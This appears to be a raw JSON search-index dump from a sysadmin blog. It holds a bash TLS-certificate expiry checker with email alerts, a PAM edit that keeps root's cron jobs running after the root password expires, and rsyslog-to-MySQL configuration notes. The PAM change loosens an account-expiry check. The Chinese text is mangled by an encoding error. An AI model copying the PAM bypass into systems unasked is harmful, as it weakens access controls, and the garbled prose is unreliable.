lwn.net\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   630\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Exit codes:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   0   - certificate is not expired\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   1   - certificate is     expired\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   254 - certificate is empty\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   255 - DNS resolution failed\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# temporary file to store certificate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ecertificate_file\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003emktemp\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# delete temporary file on exit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003etrap\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;unlink \u003c/span\u003e\u003cspan class=\"nv\"\u003e$certificate_file\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e EXIT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$#\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -eq \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nv\"\u003ewebsite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  host \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$website\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e-\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$?\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -eq \u003cspan class=\"s2\"\u003e\u0026#34;0\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"p\"\u003e|\u003c/span\u003e openssl s_client -servername \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$website\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -connect \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$website\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e:443 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed -ne \u003cspan class=\"s1\"\u003e\u0026#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p\u0026#39;\u003c/span\u003e \u0026gt; \u003cspan class=\"nv\"\u003e$certificate_file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ecertificate_size\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003estat -c \u003cspan class=\"s2\"\u003e\u0026#34;%s\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$certificate_file\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$certificate_size\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -gt \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003edate\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eopenssl x509 -in \u003cspan class=\"nv\"\u003e$certificate_file\u003c/span\u003e -enddate -noout \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed \u003cspan class=\"s2\"\u003e\u0026#34;s/.*=\\(.*\\)/\\1/\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003edate_s\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate -d \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003edate\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e +%s\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003enow_s\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate -d now +%s\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003edate_diff\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$((\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003edate_s \u003cspan class=\"o\"\u003e-\u003c/span\u003e now_s\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"m\"\u003e86400\u003c/span\u003e \u003cspan class=\"k\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$date_diff\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$date_diff\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -le \u003cspan class=\"m\"\u003e37\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          /usr/local/bin/mailsend -q -to \u003cspan class=\"s2\"\u003e\u0026#34;zhangranrui@ddky.com\u0026#34;\u003c/span\u003e -from monit@ddky.com -ssl -port \u003cspan class=\"m\"\u003e465\u003c/span\u003e -auth -auth-plan -smtp smtp.exmail.qq.com -sub \u003cspan class=\"s2\"\u003e\u0026#34;è¯ä¹¦å°±è¦åˆ°æœŸäº†\u0026#34;\u003c/span\u003e -v -user \u003cspan class=\"s2\"\u003e\u0026#34;monit@ddky.com\u0026#34;\u003c/span\u003e -pass \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e -cs \u003cspan class=\"s2\"\u003e\u0026#34;utf-8\u0026#34;\u003c/span\u003e -enc-type \u003cspan class=\"s2\"\u003e\u0026#34;base64\u0026#34;\u003c/span\u003e -M \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$website\u003c/span\u003e\u003cspan class=\"s2\"\u003e è¿˜æœ‰ \u003c/span\u003e\u003cspan class=\"nv\"\u003e$date_diff\u003c/span\u003e\u003cspan class=\"s2\"\u003e å¤©å°±è¦åˆ°æœŸäº†ï¼ï¼ï¼\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$date_s\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -gt \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$now_s\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"c1\"\u003e# ok\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"c1\"\u003e# not ok\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e254\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e255\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"æ£€æŸ¥è¯ä¹¦æ˜¯å¦è¿‡æœŸçš„è„šæœ¬"},{"content":"æ•°æ®åº“ç®¡ç†å‘˜çš„ 172.18.20.10 å’Œ 172.18.20.25 æ•°æ®åº“å¤‡ä»½è„šæœ¬æ˜¯ä»¥ root èº«ä»½è¿è¡Œçš„ï¼Œåœ¨ crontab é‡Œè·‘ï¼š\n26 11 * * * /root/scripts/mysql_backup_full_3306.sh \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 ä½†æ˜¯ç”±äº root å¯†ç ä¼šæ¯ä¸‰ä¸ªæœˆå˜æ›´ä¸€æ¬¡ï¼Œå¦‚æœæ²¡æœ‰åŠæ—¶å˜æ›´ï¼Œä¼šå¯¼è‡´ root å¯†ç å¤±æ•ˆï¼Œä»è€Œ crontab æ— æ³•æ­£å¸¸è¿è¡Œã€‚\nè§£å†³æ–¹æ³•å¾ˆç®€å•ï¼š æ‰¾åˆ° /etc/pam.d/password-auth , å…¶ä¸­ account çš„æœ‰å››è¡Œ\naccount required pam_unix.so account sufficient pam_localuser.so account sufficient pam_succeed_if.so uid \u0026lt; 1000 quiet account required pam_permit.so åœ¨å‰é¢å¢åŠ ä¸¤è¡Œï¼š\naccount required pam_access.so account [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uid account required pam_unix.so account sufficient pam_localuser.so account sufficient pam_succeed_if.so uid \u0026lt; 1000 quiet account required pam_permit.so è¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸ç”¨é‡å¯ä»»ä½•æœåŠ¡ã€‚\npam éªŒè¯çš„æ—¶å€™ï¼Œå³ä½¿å¯†ç è¿‡æœŸï¼Œcrond ä¾ç„¶æ­£å¸¸è·‘ï¼Œå°± ok äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20231211-crontab_root/","summary":"\u003cp\u003eæ•°æ®åº“ç®¡ç†å‘˜çš„ 172.18.20.10 å’Œ 172.18.20.25 æ•°æ®åº“å¤‡ä»½è„šæœ¬æ˜¯ä»¥ root èº«ä»½è¿è¡Œçš„ï¼Œåœ¨ crontab é‡Œè·‘ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e26\u003c/span\u003e \u003cspan class=\"m\"\u003e11\u003c/span\u003e * * * /root/scripts/mysql_backup_full_3306.sh \u0026gt; /dev/null 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä½†æ˜¯ç”±äº root å¯†ç ä¼šæ¯ä¸‰ä¸ªæœˆå˜æ›´ä¸€æ¬¡ï¼Œå¦‚æœæ²¡æœ‰åŠæ—¶å˜æ›´ï¼Œä¼šå¯¼è‡´ root å¯†ç å¤±æ•ˆï¼Œä»è€Œ crontab æ— æ³•æ­£å¸¸è¿è¡Œã€‚\u003c/p\u003e\n\u003cp\u003eè§£å†³æ–¹æ³•å¾ˆç®€å•ï¼š\næ‰¾åˆ° /etc/pam.d/password-auth , å…¶ä¸­ account çš„æœ‰å››è¡Œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     required      pam_unix.so\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     sufficient    pam_localuser.so\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     sufficient    pam_succeed_if.so uid \u0026lt; \u003cspan class=\"m\"\u003e1000\u003c/span\u003e quiet\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     required      pam_permit.so\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨å‰é¢å¢åŠ ä¸¤è¡Œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     required      pam_access.so\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003esuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003edefault\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eignore\u003cspan class=\"o\"\u003e]\u003c/span\u003e pam_succeed_if.so service in crond quiet use_uid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     required      pam_unix.so\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     sufficient    pam_localuser.so\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     sufficient    pam_succeed_if.so uid \u0026lt; \u003cspan class=\"m\"\u003e1000\u003c/span\u003e quiet\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     required      pam_permit.so\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸ç”¨é‡å¯ä»»ä½•æœåŠ¡ã€‚\u003c/p\u003e","title":"rootçš„crontabç”±äºrootå¯†ç å¤±æ•ˆå¯¼è‡´ä¸èƒ½æ­£å¸¸å·¥ä½œ"},{"content":"Rsyslogçš„æ¨¡æ¿æ–‡ä»¶æŒ‰æ—¥æœŸå­˜æ”¾ï¼š\n$template 10.161.54.11,\u0026#34;/var/log/rsyslog/%fromhost-ip%/netflow_%$YEAR%-%$MONTH%-%$DAY%.log\u0026#34; $template 10.161.50.5,\u0026#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%$YEAR%-%$MONTH%-%$DAY%.log\u0026#34; $template 10.161.50.7,\u0026#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%$YEAR%-%$MONTH%-%$DAY%.log\u0026#34; #ä»ç‰¹å®šipæ¥çš„æ—¥å¿—å‘åˆ°ç‰¹å®šrsyslogæœåŠ¡å™¨ä¸Šå» #:fromhost-ip, !isequal, \u0026#34;127.0.0.1\u0026#34; ?Remote :fromhost-ip, isequal, \u0026#34;10.161.54.11\u0026#34; ?10.161.54.11 :fromhost-ip, isequal, \u0026#34;10.161.50.5\u0026#34; ?10.161.50.5 :fromhost-ip, isequal, \u0026#34;10.161.50.7\u0026#34; ?10.161.50.7 Rsyslogæ‰“å‡ºæ‰€æœ‰è°ƒè¯•ä¿¡æ¯ï¼š\n*.* /var/log/debugfmt;RSYSLOG_DebugFormat\nè°ƒè¯•ä¿¡æ¯:\nFROMHOST: \u0026#39;172.18.18.9\u0026#39;, fromhost-ip: \u0026#39;172.18.18.9\u0026#39;, HOSTNAME: \u0026#39;172.18.18.9\u0026#39;, PRI: 5, syslogtag \u0026#39;time:\u0026#39;, programname: \u0026#39;time\u0026#39;, APP-NAME: \u0026#39;time\u0026#39;, PROCID: \u0026#39;-\u0026#39;, MSGID: \u0026#39;-\u0026#39;, TIMESTAMP: \u0026#39;Mar 4 09:04:45\u0026#39;, STRUCTURED-DATA: \u0026#39;-\u0026#39;, msg: \u0026#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39; escaped msg: \u0026#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39; inputname: imudp rawmsg: \u0026#39;\u0026lt;5\u0026gt;time:2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39; $!: $.: $/: Rsyslogçš„isequalï¼Œä¸å»ºè®®ï¼Œå»ºè®®ç”¨==\nif $fromhost isequal 172.18.18.9 then /var/log/nips.log\nif $fromhost-ip == \u0026#39;172.18.18.9\u0026#39; then { action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34;) } Rsyslogçš„ommysqlç”¨æ³•\n$ModLoad ommysql *.info;mail.none;authpriv.none;cron.none :ommysql:localhost,Syslog,nips,xxxxxxxx *.info;mail.none;authpriv.none;cron.none action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34;) $template dbFormat,\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;%msg%\u0026#39;, %syslogfacility%, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;%syslogtag%\u0026#39;)\u0026#34;,sql action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; serverport=\u0026#34;3306\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34; template=\u0026#34;dbFormat\u0026#34;) #172.18.31.34ä¸Šçš„å®é™…ç”¨æ³•ï¼š if $fromhost-ip == \u0026#39;172.18.18.9\u0026#39; then { if $syslogpriority == 7 then { $template dbFormat1,\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;%msg%\u0026#39;, 10, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;nips\u0026#39;)\u0026#34;,sql action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; serverport=\u0026#34;3306\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34; template=\u0026#34;dbFormat1\u0026#34;) } else { $template dbFormat2,\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;time:%msg%\u0026#39;, 10, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;nips\u0026#39;)\u0026#34;,sql action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; serverport=\u0026#34;3306\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34; template=\u0026#34;dbFormat2\u0026#34;) } } \u0026amp; ~ Rsyslogä¸­\u0026amp; ~çš„ç”¨æ³•\n:fromhost-ip,startswith,â€™192.168.1.â€™ /var/log/remote-devs.log\r\u0026amp; ~ (The next line (â€œ\u0026amp; ~â€) is important: it tells rsyslog to stop processing the message after it was written to the log. As such, these messages will not reach the local part. Without that â€œ\u0026amp; ~â€, messages would also be written to the local files.\nFacilityçš„çº§åˆ«ï¼š Serverityçš„çº§åˆ«Serverityçš„çº§åˆ« ","permalink":"https://rendoumi.com/posts/20231211-rsyslog_usage/","summary":"\u003cp\u003eRsyslogçš„æ¨¡æ¿æ–‡ä»¶æŒ‰æ—¥æœŸå­˜æ”¾ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$template\u003c/span\u003e 10.161.54.11,\u003cspan class=\"s2\"\u003e\u0026#34;/var/log/rsyslog/%fromhost-ip%/netflow_%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$YEAR\u003c/span\u003e\u003cspan class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$MONTH\u003c/span\u003e\u003cspan class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$DAY\u003c/span\u003e\u003cspan class=\"s2\"\u003e%.log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$template\u003c/span\u003e 10.161.50.5,\u003cspan class=\"s2\"\u003e\u0026#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$YEAR\u003c/span\u003e\u003cspan class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$MONTH\u003c/span\u003e\u003cspan 